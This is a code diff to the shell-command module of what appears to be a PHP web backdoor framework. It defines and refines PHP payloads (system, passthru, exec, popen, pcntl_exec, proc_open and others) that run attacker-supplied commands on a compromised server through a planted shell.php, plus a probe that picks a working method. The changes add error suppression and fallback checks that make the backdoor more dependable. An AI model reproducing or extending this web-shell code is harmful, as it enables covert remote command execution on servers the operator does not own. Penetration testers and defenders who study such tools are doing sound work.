@@ -19,36 +19,43 @@ class Sh(ModuleGuess):
     def _set_vectors(self):
         self.vectors.add_vector("system", 'shell.php', "@system('$cmd $no_stderr');")
         self.vectors.add_vector("passthru" , 'shell.php', "@passthru('$cmd $no_stderr');")
-        self.vectors.add_vector("shell_exec", 'shell.php', "echo @shell_exec('$cmd $no_stderr');")
-        self.vectors.add_vector("exec", 'shell.php',  "@exec('$cmd $no_stderr', $r);echo(join(\"\\n\",$r));")
-
-        #self.vectors.add_vector("pcntl", 'shell.php', ' $p = pcntl_fork(); if(!$p) {{ pcntl_exec( "/bin/sh", Array("-c", "$cmd")); }} else {{ pcntl_waitpid($p,$status); }}'),
-        self.vectors.add_vector("popen", 'shell.php', "$h = popen('$cmd','r'); while(!feof($h)) echo(fread($h,4096)); pclose($h);")
-        self.vectors.add_vector("python_eval", 'shell.php', "python_eval('import os; os.system('$cmd$no_stderr');")
-        self.vectors.add_vector("perl_system", 'shell.php', "$perl = new perl(); $r = @perl->system('$cmd$no_stderr'); echo $r;")
+        self.vectors.add_vector("shell_exec", 'shell.php', "print(@shell_exec('$cmd $no_stderr'));")
+        self.vectors.add_vector("exec", 'shell.php',  "$r=array(); @exec('$cmd $no_stderr', $r);print(join(\"\\n\",$r));")
+        self.vectors.add_vector("pcntl", 'shell.php', '$p=@pcntl_fork(); if(!$p) { { @pcntl_exec( "/bin/sh", Array("-c", "$cmd")); } else { @pcntl_waitpid($p,$status); }}'),
+        self.vectors.add_vector("popen", 'shell.php', "$h = @popen('$cmd','r'); if($h) { while(!feof($h)) echo(fread($h,4096)); pclose($h); }")
+        self.vectors.add_vector("python_eval", 'shell.php', "@python_eval('import os; os.system('$cmd$no_stderr');');")
+        self.vectors.add_vector("perl_system", 'shell.php', "if(class_exists('Perl')) { $perl = new Perl(); $r = $perl->system('$cmd$no_stderr'); print($r); }")
         self.vectors.add_vector("proc_open", 'shell.php', """$p = array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w'));
-$h = proc_open('$cmd', $p, $pipes); while(!feof($pipes[1])) echo(fread($pipes[1],4096));
+$h = @proc_open('$cmd', $p, $pipes); if($h&&$pipes) { while(!feof($pipes[1])) echo(fread($pipes[1],4096));
 while(!feof($pipes[2])) echo(fread($pipes[2],4096)); fclose($pipes[0]); fclose($pipes[1]);
-fclose($pipes[2]); proc_close($h);""")
-    
+fclose($pipes[2]); proc_close($h); }""")
+     
     def _set_args(self):
         self.argparser.add_argument('cmd', help='Shell command', nargs='+')
         self.argparser.add_argument('-no-stderr', help='Suppress error output', action='store_false')
         self.argparser.add_argument('-vector', choices = self.vectors.keys())
-        self.argparser.add_argument('-just-probe', help=SUPPRESS, action='store_true')
         
     def _init_stored_args(self):
         self.stored_args_namespace = StoredNamespace()
         self.stored_args_namespace['vector'] = None 
 
     def _execute_vector(self):
-
-        if not self.stored_args_namespace['vector'] or self.args['just_probe']:
-            self.__slacky_probe()
-
+        
+        # Cases: 
+        # 1. First call by terminal. No preset vector, do a slacky probe
+        # 2. first call by cmdline (no vector)
+        if not self.stored_args_namespace['vector']:
+            if self.__slacky_probe():
+                self.stored_args_namespace['vector'] = self.current_vector.name
+                
+                # If there is no command, raise ProbeSucceed and do not execute the command
+                if self.args['cmd'] == [' ']:
+                    raise ProbeSucceed(self.name, MSG_SH_INTERPRETER_SUCCEED)
+         
         # Execute if is current vector is saved or choosen
-        if self.current_vector.name in (self.stored_args_namespace['vector'], self.args['vector']):
+        if self.args['cmd'][0] != ' ' and self.current_vector.name in (self.stored_args_namespace['vector'], self.args['vector']):
             self._result = self.current_vector.execute( self.formatted_args)
+            
         
     def _prepare_vector(self):
         
@@ -69,25 +76,9 @@ fclose($pipes[2]); proc_close($h);""")
         slacky_formats = self.formatted_args.copy()
         slacky_formats['cmd'] = 'echo %s' % (rand)
         
-        if self.current_vector.execute( slacky_formats) == rand:
-            
-            self.stored_args_namespace['vector'] = self.current_vector.name
-            
-            # Set as best interpreter
-            #self.modhandler.interpreter = self.name
-            if self.args['just_probe']:
-                self._result = True 
-                raise ProbeSucceed(self.name, MSG_SH_INTERPRETER_SUCCEED)
-            
-            return
+        if self.current_vector.execute(slacky_formats) == rand:
+            return True
         
-        raise ModuleException(self.name, WARN_SH_INTERPRETER_FAIL)
-            
-            
-            
-
-
-
 
 
 
